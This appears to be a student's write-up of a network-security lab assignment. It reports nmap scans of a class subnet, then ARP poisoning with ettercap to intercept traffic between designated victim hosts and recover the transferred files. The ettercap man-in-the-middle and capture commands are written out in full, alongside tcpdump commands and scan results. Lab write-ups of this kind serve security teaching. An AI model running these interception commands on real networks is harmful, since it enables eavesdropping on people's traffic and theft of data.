## Assignment 3

### Part 2

##### Step 1

1. Determine and report, by using tools such as nmap, etc, what are the IP addresses of the victim hosts connected to the backbone
    ~~~~
    sudo nmap -sV 10.229.100.0/24 > nmap.out
    ~~~~
    Result file `nmap.out` attached. This file shows the following hosts
    ~~~~
    10.229.100.51       # TA1
    10.229.100.52       # TA2
    10.229.100.101
    10.229.100.102
    10.229.100.130      # Group 1
    10.229.100.131      # Group 2
    10.229.100.132      # Group 3
    10.229.100.133      # Group 4
    10.229.100.135      # Group 6
    10.229.100.136      # Group 7
    10.229.100.137      # Group 8
    10.229.100.138      # Group 9
    10.229.100.139      # Group 10
    10.229.100.140      # Group 11
    10.229.100.141      # Group 12
    10.229.100.142      # Ignore
    10.229.100.147      # Group 5
    10.229.100.150
    10.229.100.151
    10.229.100.154
    10.229.100.155
    10.229.100.156
    ~~~~
    The unknown hosts are victim's hosts
2. Determine and report, using the same/similar tools, what are the services running on each of the victim hosts connected to the backbone
    Based on the same output file, we can see:
    
    | host         | port state service version                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
    |--------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
    |10.229.100.101|22/tcp open  ssh     (protocol 2.0)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
    |10.229.100.102|53/tcp open  domain  dnsmasq 2.68 <br> 80/tcp open  http?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
    |10.229.100.150|53/tcp open  domain  dnsmasq 2.68 <br> 80/tcp open  http?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
    |10.229.100.151|80/tcp    open  http          Microsoft IIS httpd 8.5 <br> 135/tcp   open  msrpc         Microsoft Windows RPC <br> 139/tcp   open  netbios-ssn <br> 445/tcp   open  netbios-ssn <br> 3389/tcp  open  ms-wbt-server Microsoft Terminal Service <br> 49152/tcp open  msrpc         Microsoft Windows RPC <br> 49153/tcp open  msrpc         Microsoft Windows RPC <br> 49154/tcp open  msrpc         Microsoft Windows RPC <br> 49155/tcp open  msrpc         Microsoft Windows RPC <br> 49156/tcp open  msrpc         Microsoft Windows RPC <br> 49157/tcp open  msrpc         Microsoft Windows RPC <br> 49158/tcp open  msrpc         Microsoft Windows RPC |
    |10.229.100.154|22/tcp open  ssh     (protocol 2.0)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
    |10.229.100.155|21/tcp open  ftp     vsftpd 3.0.2 <br> 22/tcp open  ssh     (protocol 2.0)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
    |10.229.100.156|22/tcp open  ssh     (protocol 2.0)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
         
3. Determine and report the victims' OS and the OS version as accurately as you can (again using the same assortment of tools).
    ~~~~
    sudo nmap -O 10.229.100.0/24 > nmapOS.out
    ~~~~
    Result file `nmapOS.out` attached. This file shows OS of victim hosts as 
    
    | host | OS guesses |
    |---|---|
    |10.229.100.101|Linux 2.6.32 - 3.9 (96%)<br>Netgear DG834G WAP or Western Digital WD TV media player (95%)<br>Linux 2.6.32 (95%)<br>Linux 3.8 (95%)<br>Linux 3.1 (94%)<br>Linux 3.2 (94%)<br>AXIS 210A or 211 Network Camera (Linux 2.6) (94%)<br>Linux 2.6.26 - 2.6.35 (94%)<br>Linux 2.6.32 - 2.6.35 (93%)<br>Linux 2.6.32 - 3.2 (93%)|
    |10.229.100.102|Netgear DG834G WAP or Western Digital WD TV media player (95%)<br>Linux 3.1 (94%)<br>Linux 3.2 (94%)<br>AXIS 210A or 211 Network Camera (Linux 2.6) (94%)<br>Linux 3.7 - 3.9 (92%)<br>ODROID-U2 Android development board (Linux 3.0) (92%)<br>Linux 2.6.32 (92%)<br>Linux 3.6.10 (92%)<br>Linux 2.6.32 - 3.6 (92%)<br>Linux 2.6.32 - 3.9 (92%)|
    |10.229.100.150|Netgear DG834G WAP or Western Digital WD TV media player (95%)<br>Linux 3.1 (94%)<br>Linux 3.2 (94%)<br>AXIS 210A or 211 Network Camera (Linux 2.6) (94%)<br>Linux 3.7 - 3.9 (92%)<br>Linux 2.6.32 - 3.6 (92%)<br>Linux 2.6.32 - 3.9 (92%)<br>Linux 3.1 - 3.2 (91%)<br>Linux 3.3 (91%)<br>Linux 3.3 - 3.6 (91%)|
    |10.229.100.151|Microsoft Windows 7 or Windows Server 2012|
    |10.229.100.154|Netgear DG834G WAP or Western Digital WD TV media player (95%)<br>Linux 3.1 (94%)<br>Linux 3.2 (94%)<br>AXIS 210A or 211 Network Camera (Linux 2.6) (94%)<br>ODROID-U2 Android development board (Linux 3.0) (92%)<br>Linux 2.6.32 - 3.6 (92%)<br>Linux 2.6.32 - 3.9 (92%)<br>Linux 3.2.0 (92%)<br>Linux 3.1 - 3.2 (91%)<br>Linux 3.7 - 3.9 (91%)|
    |10.229.100.155|Netgear DG834G WAP or Western Digital WD TV media player (96%)<br>Linux 3.1 (93%)<br>Linux 3.2 (93%)<br>AXIS 210A or 211 Network Camera (Linux 2.6) (92%)<br>Crestron XPanel control system (91%)<br>Linux 2.4.26 (Slackware 10.0.0) (91%)<br>Linux 3.1 - 3.2 (91%)<br>Linux 3.4 (91%)<br>Linux 3.7 - 3.9 (91%)<br>Linux 2.6.32 (91%)|
    |10.229.100.156|Netgear DG834G WAP or Western Digital WD TV media player (95%)<br>Linux 3.1 (94%)<br>Linux 3.2 (94%)<br>AXIS 210A or 211 Network Camera (Linux 2.6) (94%)<br>Linux 3.7 - 3.9 (92%)<br>Linux 2.6.32 - 3.6 (92%)<br>Linux 2.6.32 - 3.9 (92%)<br>Linux 3.3 - 3.6 (91%)<br>Linux 2.4.26 (Slackware 10.0.0) (91%)<br>Crestron XPanel control system (91%)|
    
    > [...] OS detection using TCP/IP stack fingerprinting. Nmap sends a series of TCP and UDP packets to the remote host and examines practically every bit in the responses. After performing dozens of tests such as TCP ISN sampling, TCP options support and ordering, IP ID sampling, and the initial window size check, Nmap compares the results to its nmap-os-db database of more than 2,600 known OS fingerprints and prints out the OS details if there is a match. Each fingerprint includes a freeform textual description of the OS, and a classification which provides the vendor name (e.g. Sun), underlying OS (e.g. Solaris), OS generation (e.g. 10), and device type (general purpose, router, switch, game console, etc). Most fingerprints also have a Common Platform Enumeration (CPE) representation, like cpe:/o:linux:linux_kernel:2.6.
    
    More information on TCP/IP fingerprinting can be found [here](https://nmap.org/book/man-os-detection.html).
    
    The most difficult to guess are Unix-based-OS hosts. The reason might be because these OSes have similar TCP/IP fingerprint (becasue similar kernel), which make distinguishing them difficult.

#### Step 2

1. Determine the victim hosts
    
    To produce host list file:
    ~~~~
    sudo ettercap -T -e \S -i eth1 -n 255.255.255.0 -M arp /10.229.100.101-156// -k hosts.out
    sudo vim hosts.out
    ~~~~
    In vim remove all known hosts (`hosts.out` attached).
    
2. Determine what connections are initiated (including which client is the host, and which one is the server for each connection)
    ~~~~
    sudo ettercap -T -f 'host not 10.229.100.141' -e \S -i eth1 -M arp -j hosts.out -w a3.pcap
    ~~~~
    Connections found
    
    | client | server | request |
    | :---: | :---: | :---: |
    | 10.229.100.101 | 10.229.100.151 | HTTP example.mp3 <br> HTTP page.htm |
    | 10.229.100.154 | 10.229.100.151 | HTTP example.gif |
    | 10.229.100.154 | 10.229.100.101 | SSH |
    | 10.229.100.151 | 10.229.100.102 | DNS standard query |
    * Found broadcast message from `10.229.100.151` to `10.229.100.255` advertising NetBIOS Datagram Service.
    * Also found ping in all pairs of victim hosts.
    
3. Determine what is the service(s) to which the connections are established
    
    Answered above
    
4. Identify the nature and extract the contents of the transfers between the hosts (not just a dump of bytes, but qualitatively "what are they about"?)

    * Output files attached: `example.mp3`, `example.gif`, `page.htm`
    * Cannot determine SSH content

* The ARP activity for the period just before and just after you performed ARP poisoning
    ~~~~
     sudo timeout 20s tcpdump -l -i eth1 arp -w before.pcap
     sudo timeout 20s tcpdump -l -i eth1 arp -w after.pcap
    ~~~~
    
    Read attached `before.pcap` and `after.pcap` in tcpdump (`tcpdump -r <filename>`)
    
* Captured packets of the communication between the hosts (if many, then a compressed archive of the packet capture)
    ~~~~
    sudo ettercap -T -f 'host not 10.229.100.141' -e \S -i eth1 -M arp -j hosts.out -w a3.pcap
    ~~~~
    
    See attached `a3.pcap`
    
* Any contents (packet payload, e.g., files) that you were able to reconstruct from the communication between the victims

    See attached `example.mp3`, `example.gif`, and `page.htm`

* The output you got from ettercap
    ~~~~
    sudo ettercap -T -f 'host not 10.229.100.141' -e \S -i eth1 -M arp -j hosts.out > a3.out
    ~~~~
    See attached `a3.pcap` and `a3.out`